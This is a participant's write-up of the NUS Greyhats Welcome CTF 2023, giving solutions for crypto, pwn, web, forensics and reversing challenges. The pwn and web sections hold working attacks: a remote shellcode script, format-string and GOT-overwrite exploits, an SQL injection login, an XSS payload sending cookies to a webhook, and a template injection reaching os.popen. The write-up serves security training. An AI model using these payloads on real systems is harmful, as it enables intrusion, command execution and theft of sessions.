# NUS Greyhats - Welcome CTF 2023

- https://welcomectf.nusgreyhats.org/
- 25 August 22:00 - 27 August 22:00

---

## Cryptography

### RSA-0

Simple decryption given e, c, N, p.

```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

# Given e, c, N, p:
c = 4953032786967695172867746734535736079394492629602997339937492536588870691711986761068264007330882164392379507566471358534367765212486515498477609692492911155794283957262806698099786347094158445145170272211735686373893103636701694078305223070255435694331868985217654529297523802803590925672631170974389903981382990420544549983820761601249866397812326812610801849185904577659135865231550382751298707081100460185455711631943830891955142829018150765638711570949799431761037124409794916415449358686605453139165302215817990962930172443187260276254923440306988071118282041585190410317783133379966160841350726595250460775910
N = 11052066728696584478173981422690934727330190793168299198052867320274026447841993970605723466693761160829620136414879721712829623869643444374519514000750617448158117024814600788220593228828959483716001856243940202140944664148436551675864046041578260049777013478819290369064647288351718954552136332329682752868851740459175906526315306668446899441322091498432444869668162455787655862796220319987420441021049615662183046206347457741254759796376818396309462269807308324577458538550348792145189261384362210189808341660028210961095419046778335823101189833780354843059884835792177540367715682849889111490004095808710040472619
p = 116425759392699888294847997537971717113216143488367405704625594087025604242904070048081650359417393094175312627188048152671036012912290926342003535891931719342443510501306306058531798298071225935871730138080360474492700290821852718100178190349149094830491644459446647257240183962386247376075386619158754717083
e = 0x10001

# Compute phi(n)
q = N//p
phi = (p - 1) * (q - 1)

# Compute modular inverse of e
gcd, a, b = egcd(e, phi)
d = a

# Decrypt ciphertext
pt = pow(c, d, N)
print("pt: " + hex(pt) )
print(bytes.fromhex(hex(pt)[2:]))
```

> greyhats{HelloWorld_from_RSA_jHZpVMPf8CnwWf8s}

### Multi XOR

> The original plaintext.txt file contains 21 lines. Each of the first 20 lines contain an English sentence (total of 20 English sentences). The last line contains the content of the flag.

> The English sentences includes (but not only) alphanumeric characters, lower and uppercase, commas ,, and do not include a period .

One Time Pad used more than once. Through context, we can manually derive the key.

See [multi_xor_solution.py](multi_xor_solution.py)

### DLP-1

Given the code

    #!/usr/local/bin/python

    from secrets import randbits
    from hashlib import shake_256

    FLAG = b'REDACTED'

    def encryptFlag(s):
        key = shake_256(str(s).encode()).digest(len(FLAG))
        return bytes([i ^ j for i, j in zip(key, FLAG)])

    print("Let's perform Diffie–Hellman Key exchange!")
    p = int(input("Send me your modulus: "))
    g = int(input("Send me your base: "))

    secret = randbits(1024)
    A = pow(g, secret, p)
    print(f"My public output: {A}")
    print(f"c: {encryptFlag(secret).hex()}")

Solve using Pohlig–Hellman algorithm.

> Reference: https://github.com/wborgeaud/ctf-writeups/blob/master/angstromctf2019/Paint.md

Solution script [dlp1_solution.py](dlp1_solution.py)

    Recovered Secret: 134486725846635892460094811381364623410467036013115404529066725442953574464376784720109159928505509310050464253225974114394465177184963171000251481582726946791972775066931241731734356807176634776839815264310013085879286288604332095435769364994438749219384696403279025601855126832654031669345056416624544859104
    Recovered plaintext: b'greyhats{modulus_must_be_checked_in_dlp_y632SktsY2vXTMaP}'

### DLP-2

This time the modulus is checked whether it is prime.

We can exploit it using psuedoprimes or weak primes and perform a discrete log.

> Reference: https://ctftime.org/writeup/29596

Solution script [dlp2_solution.sage](dlp2_solution.sage)

    $ sage dlp2_solution.sage
    secret 139441028792895360026471404785116990838745420612311248525912467668336085969081709798674903812667169502334828022013855340412890308826976033936779449837173083474938664605402729321736153888850463136273681623857017918940357895496901853096592491748074882476024625967411080234030095520876498537361887373899494748408
    b'greyhats{safe_prime_number_should_be_use_for_dlp_yuDmuQhX3yqVrUsd}'

---
## Pwn

### ScissorsPaperPwn

Buffer overflow on `gets()` function.

    Choose:
    0: Scissors
    1: Paper
    2: Stone
    Your choice: 1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

    You chose Paper.
    AI chose Scissors.
    You lose! Ha >:)

    You win! How did you even 2021161080 points?!?
    As promised, here is the flag:
    greyhats{Game_hacker_in_the_making?}

### Complete Me

This is a shellcoding challenge — the program prompts for an input and executes it as code.

Using pwntools we can generate shellcode. Take note that the architecture was found out to be x64.

```python
from pwn import *
sh = remote('34.87.186.254', 21238)
sh.recvuntil(b"The flag is:")
sh.sendline(bytes(asm(shellcraft.amd64.linux.sh(), arch='amd64')))
sh.interactive()
```

Flag

    [x] Opening connection to 34.87.186.254 on port 21238: Trying 34.87.186.254
    [*] Switching to interactive mode
    The flag is: ls
        flag.txt
        run
    cat flag.txt
        greyhats{y0u_4r3_4n_4553mb1y_pr0}

### filelen

Off-by-one error when doing the read() function. When sending the name of the maximum length, the null pointer is overlooked.

```python
from pwn import *
context.log_level = 'error'

def attempt(count):
    sh = remote('34.87.186.254', 21235)
    sh.sendline(b'flag.txt') # Which file do you want to measure?
    sh.sendline(str(count).encode()) # Length
    sh.sendline(b' ' * count) # Name
    sh.recvuntil(b'Goodbye ')
    return (sh.recvall())

for i in range(2, 60, 1):
    print("#", i, attempt(i))
```

This is the output from the script

    # 2 b'  eyhats{th3_fl4g_w4s_frq\x0b\x02!\n'
    # 3 b'   yhats{th3_fl4g_w4s_frq\x0b\x02!\n'
    ...
    # 22 b'                      frq\x0b\x02!\n'
    # 23 b'                       rq\x0b\x02!\n'
    # 24 b'                        q\x0b\x02!\n'
    # 25 b'                         3_bu7_y0u_br0uga\x0b\x02!\n'
    # 26 b'                          _bu7_y0u_br0uga\x0b\x02!\n'
    # 27 b'                           bu7_y0u_br0uga\x0b\x02!\n'
    ...
    # 39 b'                                       ga\x0b\x02!\n'
    # 40 b'                                        a\x0b\x02!\n'
    # 41 b'                                         t_1t_b4ck_bY_h3Q\x0b\x02!\n'
    # 42 b'                                          _1t_b4ck_bY_h3Q\x0b\x02!\n'
    ...
    # 54 b'                                                      h3Q\x0b\x02!\n'
    # 55 b'                                                       3Q\x0b\x02!\n'
    # 56 b'                                                        Q\x0b\x02!\n'
    # 57 b'                                                         p_r3us3!}!\n'
    # 58 b'                                                          _r3us3!}!\n'
    # 59 b'                                                           r3us3!}!\n'

From the above we can get the following

    ??eyhats{th3_fl4g_w4s_fr?3_bu7_y0u_br0ug?t_1t_b4ck_bY_h3?p_r3us3!}

Some guesswork to get the flag

    greyhats{th3_fl4g_w4s_fr33_bu7_y0u_br0ught_1t_b4ck_bY_h34p_r3us3!}

### fsa

Pointer to the flag is given to us. Print it out using format string attack. 

```python
from pwn import *
def send_payload(payload):
        s.sendline(payload)
        r = s.recvline()
        s.recvline()
        return r

s = remote('34.87.186.254', 25236)
s.recvuntil(b'Flag is at ')
addr = int(s.recvline().strip().decode(), 16)
s.sendline(p32(addr) + b"(%6$p)%6$s")
s.interactive()
# Enter your input: 
# 0[V(0x565b3020)greyhats{f0rmAt_5trin9_vuln3rabi1ities_4r3_d4ngerous}
```

> greyhats{f0rmAt_5trin9_vuln3rabi1ities_4r3_d4ngerous}

### Where GOT shell?

Decompile in Hopper

    int main(int arg0, int arg1) {
        setvbuf(*__TMC_END__, 0x0, 0x2, 0x0);
        puts("I'll let you write one 8 byte value to memory.\nWhere would you like to write this 8 byte value: ");
        __isoc99_scanf(0x402079);
        sprintf(&var_100, "What value to write to %p: ", var_108);
        puts(&var_100);
        __isoc99_scanf(0x402079);
        sprintf(&var_100, "Okay, writing %lx to %p", var_110, var_108);
        puts(&var_100);
        *var_108 = var_110;
        puts("Okay, exiting now...\n");
        rax = exit(0x1);
        return rax;
    }

    int win() {
        rax = system("cat flag.txt");
        return rax;
    }

Override GOT entry of `exit()` to point to `win()`.

- Address of exit@GOT: 0x0404028
- Address of win(): 0x0401176

Solving

    $ nc 34.87.186.254 26879
    I'll let you write one 8 byte value to memory.
    Where would you like to write this 8 byte value: 
    0x0404028
    What value to write to 0x404028: 
    0x0401176
    Okay, writing 401176 to 0x404028
    Okay, exiting now...

> greyhats{G0t_C4nc3r_y3T?_ad8123fa}

---

## Web

### babysqli

Login with this payload.

- Username: `admin`
- Password: `' or 1=1;--`

> greyhats{B4by_5qL1_1s_e4sy_4nd_fUn}

### Inspector

From index
    
      <!-- greyhats{1_4 -->

From /css/main.css

    /* p3t0r_n0w} */

From aos.js:

    //m_4n_ins

> greyhats{1_4m_4n_insp3t0r_n0w}


### SS Xperience

Admin's cookies contain the flag. Admin will also visit your posted content.

The content may contain HTML which will be parsed.

With this payload, the page will redirect to a webhook, with the cookies passed as a parameter.

```html
<script>
    function listCookies() {
    var theCookies = document.cookie.split(';');
    var aString = '';
    for (var i = 1 ; i <= theCookies.length; i++) {
        aString += i + ' ' + theCookies[i-1] + "\n";
    }
    return aString;
    }
    window.location = "https://webhook.site/c0010b02-1d04-4bf8-ae2a-47f6e6ec5f97?cookie=" + listCookies();
</script>
```

> Query strings
> cookie	1 flag=greyhats{b4by_x55_scr1pt1ng_92488c0f2286e33bc1eda97a2beb1a2b}


---

## Forensics

### More than meets the eye

Text hidden in the LSB

Use this tool https://stegonline.georgeom.net/image

    greyhats{Y0U_diDNt_nEeD_@_Fla$hLight_4_THi$}

### babycake

#### Part 1

Given welcome_ctf.jpg

    $ exiftool welcome_ctf.jpg' 
    ExifTool Version Number         : 12.40
    ...
    Make                            : 67726579686174737b746834745f
    ...
    Comment                         : Check out some of my other works! https://tinyurl.com/y42zcvtm

Hex to ASCII: `greyhats{th4t_`

#### Part 2

We download cute_cat.png. Extract via stegolsb

    pip install stego-lsb
    stegolsb steglsb -r -i cute_cat.png -o output_file -n 2

output_file contains: `w4s_much_`

#### Part 3

Extract using binwalk

    $ binwalk --dd=".*" cute_cat.png
    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             PNG image, 1200 x 1200, 8-bit/color RGB, non-interlaced
    54            0x36            Zlib compressed data, default compression
    1010210       0xF6A22         PNG image, 1536 x 960, 8-bit/color RGB, non-interlaced
    1010301       0xF6A7D         Zlib compressed data, compressed

Open up F6A22.png: `b1g_c4k3}`


> greyhats{th4t_w4s_much_b1g_c4k3}

---

## Reverse Engineering

### Puzzles

Given:

    C0 = P0 xor P1 xor K
    C1 = P1 xor P2 xor K
    C2 = P2 xor P3 xor K
    C3 = P3 xor P4 xor K
    C4 = P4 xor P0 xor K

We also know the flag format:

    P0 = "greyhats"

Combining them, we get:

    C1x2 = P1 xor P3
    C3x4 = P0 xor P3

    C1x2x3x4 = P0 xor P1
    C0x1x2x3x4 = K



Solving

```python
import base64
from textwrap import wrap
def xor(a:bytes, b:bytes) -> bytes:
    return bytes(i^j for i, j in zip(a, b))

# Split up into C chunks of 8.
ct = base64.b64decode('+hpPlyY9EZf7WVLdKgMI198cSt0gAyLmiE4Bgj19bqiwSRSkJixFtQ==')
C_len = 8
C = [ct[i:i + C_len] for i in range(0, len(ct), C_len)] 

# Solve for K
K = xor(C[0], xor(C[1], xor(C[2], xor(C[3], C[4]))))

# Now we can get the P xor combinations
P0x1 = xor(C[0], K)
P1x2 = xor(C[1], K)
P2x3 = xor(C[2], K)
P3x4 = xor(C[3], K)
P4x0 = xor(C[4], K)

# Solve for P1, knowing P0
P0 = b"greyhats"
P1 = xor(P0x1, P0)
P2 = xor(P1x2, P1)
P3 = xor(P2x3, P2)
P4 = xor(P4x0, P0)

# Flag
print(P0 + P1 + P2 + P3 + P4)
#b'greyhats{0h_y0u_f1x3d_m3_up_s0_n1c3ly!!}'
```

### Heart

In this challenge, we are given a obfuscated meow.py:

After putting through some prettifiers and manually refactoring, I get the following script. [meow_cleaned.py](meow_cleaned.py).

Important to note is that the flag function has some magic XOR keys as follows:

```python
(
    lambda _: (
        lambda j: print(
            (
                b"\n"
                + b"%s{%s}"
                % (
                    xor(b"a\36\xaf\xdb\x81" b"\xa5" b"\xfe\x90", j),
                    xor(
                        __file__.encode() * 2,
                        b"\13q;Bdx&c\14s\30:ku<>+\x0e'\x1cq*1Cg;:r\r\x17,r%\"s",
                    ),
                )
            ).decode()
        )
        if j == b"\x06l\xca\xa2\xe9\xc4\x8a\xe3X\xf1\xe3\x00n\xa2C\x14:\x0fb\xc3"
        else print("\x1b\08" + open(__file__).read())
    )(j.__defaults__[1][0])
    # resolves to `thisfile` after it goes through f() fractal generation process.
)
```

Here, we realise that `xor(b"a\36\xaf\xdb\x81" b"\xa5" b"\xfe\x90", j),` is actually the flag header of `greyhats`. We can verify it as such by running this code:

```python
xor = lambda x, y: bytes([x ^ y for x, y in zip(x, y)])

j = b"\x06l\xca\xa2\xe9\xc4\x8a\xe3X\xf1\xe3\x00n\xa2C\x14:\x0fb\xc3"
part1 = xor(b"a\36\xaf\xdb\x81" b"\xa5" b"\xfe\x90", j)
print(part1)
# b'greyhats'
```

The magic `j` was derived from `thisfile` (the python script's filename) after it goes through f() fractal generation process. The process is in the source code as follows:

```python
(...) for globals()["j"] in [
    lambda z, c, h=hashlib.sha1(), thisfile=[sys.argv[0].encode()], n=0: (
        lambda _: n / 100
    )([h.update((chr(n).encode())) for thisfile[0] in [xor(thisfile[0], myprinter(h.digest()))]])
    if abs(z) > 2 or n >= 100
    else j(z * z + c, c, h, thisfile, n + 1)
]
```

Note that here, I hijacked the hex digest function by wrapping it with `myprinter()` which is my own function to print out all the xor-ed bytes.

    def myprinter(x):
        print(x.hex())
        return x

From all the print-outs, I combined them into a single XOR key. After XOR-ing them together, I get `b'C-\x9e\x8f\xbd\x8c\xc3\xb0u\xa2\xb6C%\xe7\x11Fh!\x12\xba'`. Verify that the key is correct. We see the required filename.

```python
hexes = b'C-\x9e\x8f\xbd\x8c\xc3\xb0u\xa2\xb6C%\xe7\x11Fh!\x12\xba'
magic = b"\x06l\xca\xa2\xe9\xc4\x8a\xe3X\xf1\xe3\x00n\xa2C\x14:\x0fb\xc3"
print(xor(hexes, magic))
# b'EAT-THIS-SUCKERRR.py'
```

Finally, solving everything

```python
part1 = "greyhats"
v = (b"\13q;Bdx&c\14" b"s\30:ku<>" + b"+" + b"\x0e'\x1cq*1Cg;:r\r\x17,r%\"s")
key = "EAT-THIS-SUCKERRR.py"
part2 = xor(key.encode() * 2, v)
print(b"%s{%s}" % (part1, part2))
# b'greyhats{N0oo00o0! My 0nly We4ken3ss! Dy1ng!}'
```

### Random Flag Encryptor

Random generator is seeded with the time. Bruteforce seed by counting backwards in time.

```python
import time, random

def xor_again(t):
    flag = b'\xeb; &\xcd{\x14\xb1 }\xf6\xb8\xd57\x10\x17\x88m\x93B\x05U>\x1a\xe5\x8c\xf6\x88N\xe7*\xe9b\xa4\xd5J\r8\x8b\x08\xeb\x1b\xf8\xde\xa9\xa8a\xcc\xbaA\x0f\x18\x06\xe98'
    random.seed((t ^ ((t & 0xFFFF) * (t >> 16)) ^ ((t << 5) & 0xFFFFFFFF) ^ ((t >> 3) & 0xFFFFFFFF) ^ ((t << 4) & 0xFFFFFFFF)) & 0xFFFFFFFF)
    encrypted_flag = []
    for char in flag:
        key = random.randint(1, 255)
        encrypted_char = (char) ^ key
        encrypted_flag.append(encrypted_char)
    return bytes(encrypted_flag)

current_time = 1693059602
while True:
    print("\rTime:", current_time, end="----")
    result = xor_again(current_time)
    if b'greyhats' in result:
        print()
        print(result)
        break
    current_time -= 1

# greyhats{1_w1sh_7H3r3_W45_4_r4nd0m_cHall3n93_g3n3r470r}
```

---

## Misc

### It is not what it seems

Inspect elements on the CTF description

### Pi Master

There was a bug in the challenge. Only requires me to send 2 digits repeatedly for 314 times. 

    from pwn import *
    sh = remote('34.87.186.254', 25555)
    sh.sendline(b'y')
    for i in range(315):
        print(i, sh.recvuntil(b"?"))
        sh.sendline(b'14')

    sh.interactive()
    # greyctf{m3m0r1s3d_4_m1ll10n_dig1ts_0f_pi}

### We're no strangers to love

```
$ dig TXT logppm.cc
```

> greyhats{sometimes_dns_record_contain_useful_information_qGmF3ZDEgQ7Gck75}

---

## Unsolved

### Web: RCE won't help

Got a shell using this script. However the files are all empty. Not sure where to find the cached copy.

```python
import requests
import html
def submit(payload):
    url = 'http://34.87.186.254:23545/login'
    myobj = {'username': payload}
    res = requests.post(url, data=myobj)
    return html.unescape(res.text)

def myshell(cmd='ls -la'):
    payload = "{{"
    payload += "'abc'.__class__.__base__.__subclasses__()[455]" # <class 'subprocess.Popen'>
    payload += ".__init__.__globals__" # Access __globals__
    payload += "['os']" # <module 'os' (built-in)>
    payload += f".popen('{cmd}').read()" # We got the shell
    payload += "}}"
    print(submit(payload))

myshell('whoami')
# Welcome www-data
myshell('cat app.py')
# 
myshell('ls -la')
# Welcome total 20
# drwxr-xr-x 1 root     root     4096 Aug 25 09:46 .
# drwxr-xr-x 1 root     root     4096 Aug 26 05:49 ..
# -rw-r--r-- 1 www-data www-data 1130 Aug 26 08:41 app.py
# -rw-r--r-- 1 root     root        6 Aug 25 03:02 requirements.txt
```

### Web: toddlersqli

Still can't find the flag.

- [toddlersqli_attempt.ipynb](toddlersqli_attempt.ipynb)
        
### Forensics: Spy Operation (UNSOLVED)

Crack report.txt using https://www.quipqiup.com/.

    For authorized eyes only. Unauthorized access, dissemination, or use is strictly prohibited

Crack legacy zip encryption with Biham and Kocher's known plaintext attack?

- https://github.com/kimci86/bkcrack/blob/master/example/tutorial.md
- ./bkcrack -C ../secret.zip -c report.txt -p report.txt 

### Crypto: RSA-2

The modulus N is made up of many composite factors. Hence, the correct phi must be calculated to decrypt.

```python
# N has many factors
px = [
    # Primes found using factordb:
        2, 2, 2, 5, 269, 353, 4243, 24247, 1924543,
    # Primes found using yafu:
        346338676705159, 98234797292003, 16744603995961, 15037950174647973242719963, 10735128842408640531333401,
    # Unable to factorise this composite:
        246145575131493436287140354547714171975910940339813442134620443380285894854465018330992741814067206621087184265563931418030579134549843505859906361674575137831623697204978416775711500235997503088080358275962816630929825940921881725411570783399145535171589284554111151408392440158252920266705456440444133009556571081060004974579713965181383231017297725694478145937070337412826886568071196497978866548105201669933852095421110321663510158696604628165284798376766707601688084084680148163471812247050551212797
]

# To calculate phi = (p-1) * (q-1) * (r-1) * ...
phi = reduce((lambda x, y: x * y), [(i-1) for i in px])
```

### Crypto: XOR with fixed length key

See [xor_fixed_key_notebook.ipynb](xor_fixed_key_notebook.ipynb)

Challenge code

    import os, random, hashlib
    from itertools import cycle

    pt   = [i%230 for i in os.urandom(500000)]
    klen = random.randint(1000,10000)
    key  = random.getrandbits(klen*8).to_bytes(klen, 'big')

    open('ct', 'wb').write(bytes(c^i for c,i in zip(pt, cycle(key))))

    flag = "greyhats{%s}"%hashlib.sha256(key).hexdigest()
    print(flag)

Hint: Gotten the key length but there's too many possibilities? That's great! Now you can ignore the non-uniform distribution of the plaintext and focus entirely on exploiting python's random module.

Mini technicality: Please assume that klen and key are generated independently. This is because the challenge file was generated 2 years ago and I can no longer guarantee that they are generated with the same random internal state given that I have the memory of a goldfish. Regardless, the intended solution doesn't require klen to be generated with the same random internal state.



